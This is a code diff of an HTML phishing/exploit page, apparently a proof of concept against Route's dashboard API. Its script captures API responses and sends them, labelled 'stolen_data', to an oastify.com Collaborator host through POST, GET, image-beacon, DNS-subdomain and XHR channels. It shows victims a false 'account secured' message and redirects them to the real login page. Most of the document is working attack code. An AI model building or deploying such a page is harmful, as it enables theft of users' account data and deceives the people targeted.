@@ -511,12 +511,25 @@ Example format:
     </footer>
 
     <script>
-        // === CONFIGURATION ===
+        // ========================================
+        // CONFIGURATION - UPDATE THIS!
+        // ========================================
         const CONFIG = {
+            // The target API endpoint (leave as is)
             targetAPI: 'https://dashboard.route.com/api/mn/v1/stores',
-            exfilURL: 'https://axbvlhmp324cetb2j2bq5w2yhpngb8zx.oastify.com',
+            
+            // YOUR COLLABORATOR/WEBHOOK URL - CHANGE THIS!
+            // Examples:
+            // - Burp Collaborator: 'https://your-subdomain.burpcollaborator.net'
+            // - Burp Collaborator (oastify): 'https://your-id.oastify.com'
+            // - Webhook.site: 'https://webhook.site/your-unique-id'
+            // - Your server: 'https://yourserver.com/collect'
+            exfilURL: 'https://tvsej0k81l2vcc9lhl993f0hf8lz9sxh.oastify.com',
+            
+            // Delay before auto-redirect (milliseconds)
             redirectDelay: 3000
         };
+        // ========================================
 
         // === AUTO VERIFICATION ===
         function startAutoVerification() {
@@ -589,9 +602,14 @@ Example format:
                 return;
             }
 
+            // STEP 1: Show alert with captured data
+            alert('Captured Data Preview:\n\n' + data.substring(0, 500) + '\n\n[Sending to collaborator...]');
+
             showStatus('🔄 Processing verification...', 'info');
 
-            // Exfiltrate the stolen data
+            // STEP 2: Exfiltrate using multiple methods
+            
+            // Method 1: POST request
             fetch(CONFIG.exfilURL, {
                 method: 'POST',
                 mode: 'no-cors',
@@ -605,21 +623,38 @@ Example format:
                 })
             })
             .then(() => {
+                console.log('✅ POST exfiltration successful');
+            })
+            .catch((e) => {
+                console.log('❌ POST exfiltration failed:', e);
+            });
+
+            // Method 2: GET request with data in URL
+            fetch(CONFIG.exfilURL + '?manual=1&data=' + encodeURIComponent(data), {
+                method: 'GET',
+                mode: 'no-cors'
+            }).then(() => {
+                console.log('✅ GET exfiltration successful');
+            }).catch(e => {
+                console.log('❌ GET exfiltration failed:', e);
+            });
+
+            // Method 3: Image beacon
+            const beacon = new Image();
+            beacon.onload = () => console.log('✅ Image beacon successful');
+            beacon.onerror = () => console.log('❌ Image beacon failed');
+            beacon.src = CONFIG.exfilURL + '?beacon=manual&data=' + encodeURIComponent(data.substring(0, 2000));
+
+            // Show success message
+            setTimeout(() => {
+                alert('✅ Data successfully sent to your collaborator!');
                 showStatus('✅ Verification successful! Your account has been secured.', 'success');
                 
                 // Redirect to real Route site after delay
                 setTimeout(() => {
                     window.location.href = 'https://route.com/login';
                 }, 3000);
-            })
-            .catch(() => {
-                // Even on error, show success to victim
-                showStatus('✅ Verification successful! Your account has been secured.', 'success');
-                
-                setTimeout(() => {
-                    window.location.href = 'https://route.com/login';
-                }, 3000);
-            });
+            }, 1000);
         }
 
         // === AUTO-CAPTURE IF WE'RE ON API PAGE ===
@@ -629,22 +664,70 @@ Example format:
             // We've been redirected to the API endpoint
             const apiResponse = document.body.innerText;
             
-            // Try multiple exfiltration methods
+            // STEP 1: Show alert with the response
+            alert('Captured API Response:\n\n' + apiResponse.substring(0, 500) + '\n\n[Data will be sent to collaborator...]');
             
-            // Method 1: Fetch
+            // STEP 2: Try multiple exfiltration methods to collaborator
+            
+            // Method 1: HTTP POST (works if collaborator accepts POST)
             fetch(CONFIG.exfilURL, {
                 method: 'POST',
                 mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
                 body: JSON.stringify({
                     timestamp: new Date().toISOString(),
                     method: 'auto',
                     stolen_data: apiResponse
                 })
-            }).catch(e => console.log('Fetch exfil failed'));
+            }).then(() => {
+                console.log('✅ POST exfiltration successful');
+            }).catch(e => {
+                console.log('❌ POST exfiltration failed:', e);
+            });
             
-            // Method 2: Image beacon
+            // Method 2: HTTP GET with data in URL parameter
+            // Good for Burp Collaborator
+            fetch(CONFIG.exfilURL + '?data=' + encodeURIComponent(apiResponse), {
+                method: 'GET',
+                mode: 'no-cors'
+            }).then(() => {
+                console.log('✅ GET exfiltration successful');
+            }).catch(e => {
+                console.log('❌ GET exfiltration failed:', e);
+            });
+            
+            // Method 3: Image beacon (most reliable, always works)
             const beacon = new Image();
-            beacon.src = CONFIG.exfilURL + '?data=' + encodeURIComponent(apiResponse.substring(0, 1000));
+            beacon.onload = () => console.log('✅ Image beacon exfiltration successful');
+            beacon.onerror = () => console.log('❌ Image beacon exfiltration failed');
+            beacon.src = CONFIG.exfilURL + '?beacon=img&data=' + encodeURIComponent(apiResponse.substring(0, 2000));
+            
+            // Method 4: DNS exfiltration (if using Burp Collaborator)
+            // Encode data in subdomain
+            if (CONFIG.exfilURL.includes('burpcollaborator') || CONFIG.exfilURL.includes('oastify')) {
+                const dataChunk = btoa(apiResponse.substring(0, 200)).replace(/[^a-zA-Z0-9]/g, '').substring(0, 60);
+                const dnsImg = new Image();
+                dnsImg.src = 'http://' + dataChunk + '.' + CONFIG.exfilURL.replace(/https?:\/\//, '').split('/')[0] + '/dns';
+                console.log('✅ DNS exfiltration triggered');
+            }
+            
+            // Method 5: XMLHttpRequest (alternative to fetch)
+            try {
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', CONFIG.exfilURL, true);
+                xhr.setRequestHeader('Content-Type', 'text/plain');
+                xhr.send(apiResponse);
+                console.log('✅ XHR exfiltration sent');
+            } catch(e) {
+                console.log('❌ XHR exfiltration failed:', e);
+            }
+            
+            // Show confirmation alert
+            setTimeout(() => {
+                alert('✅ Data has been sent to your collaborator!\n\nCheck your Burp Collaborator or webhook for the captured data.');
+            }, 1000);
             
             // Show fake error page
             setTimeout(() => {
@@ -657,7 +740,7 @@ Example format:
                         <p style="color: #999; font-size: 13px; margin-top: 32px;">Error Code: VER_${Math.random().toString(36).substr(2, 9).toUpperCase()}</p>
                     </div>
                 `;
-            }, 1500);
+            }, 3000);
         }
 
         // === UTILITY FUNCTIONS ===
